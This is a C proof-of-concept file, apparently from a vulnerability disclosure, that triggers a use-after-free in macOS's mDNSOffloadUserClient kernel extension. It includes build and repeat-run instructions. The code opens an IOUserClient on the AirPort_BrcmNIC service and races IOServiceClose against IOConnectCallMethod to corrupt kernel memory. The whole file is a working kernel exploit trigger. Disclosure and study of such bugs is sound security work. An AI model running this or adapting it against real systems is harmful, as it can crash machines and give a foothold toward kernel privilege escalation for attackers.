/**
 * Brief: Use after free in mDNSOffloadUserClient.kext
 * Repro:
 *	 1. clang mDNSOffloadUserClientUaF.c -o mdns_uaf -framework IOKit
 *	 2. while true; do ./mdns_uaf; done
 */
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdio.h>

io_connect_t g_client = MACH_PORT_NULL;
int g_start = 0;

void *th_close(void *arg) {
    while (!g_start) {}
    printf("[+] Close Client\n");
    IOServiceClose(g_client);
    return NULL;
}

int main(int argc, char **argv) {
    const char *service_name = "AirPort_BrcmNIC";
    /*const char *service_name = "BCM5701Enet";*/

    io_service_t service =
        IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(service_name));
    if (service == MACH_PORT_NULL) {
        printf("[-] Cannot get matching service of %s\n", service_name);
        return 0;
    }
    printf("[+] Get matching service of %s, service=0x%x\n", service_name, service);

    io_connect_t client = MACH_PORT_NULL;
    kern_return_t ret = IOServiceOpen(service, mach_task_self(), 0x6d444e53, &client);
    if (ret != KERN_SUCCESS) {
        printf("[-] Open service of %s failed, Reason: %s\n", service_name, mach_error_string(ret));
        return 0;
    }
    printf("[+] Open IOUserClient of %s succeed, client=0x%x\n", service_name, client);

    g_client = client;
    pthread_t thread_id;
    pthread_create(&thread_id, NULL, th_close, NULL);
    g_start = 1;

    usleep(1);
    printf("[+] IOConnectCallMethod running...\n");
    ret = IOConnectCallMethod(client, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);

    pthread_join(thread_id, NULL);
    return 0;
}
